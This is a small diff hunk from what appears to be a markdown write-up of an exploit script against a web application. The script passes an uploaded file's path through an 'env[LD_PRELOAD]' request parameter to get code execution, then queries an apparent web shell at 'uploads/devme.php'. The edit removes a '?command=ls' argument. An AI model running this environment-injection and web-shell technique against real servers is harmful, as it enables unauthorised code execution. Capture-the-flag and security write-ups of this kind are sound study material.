@@ -233,7 +233,7 @@ file_uploaded = r.text[r.text.index(': ')+2:]
 print(file_uploaded)
 print(requests.get(url, params={'env[LD_PRELOAD]':file_uploaded}).status_code)
 
-results = requests.get(url+'uploads/devme.php?command=ls')
+results = requests.get(url+'uploads/devme.php')
 print(results.text)
 ```
 
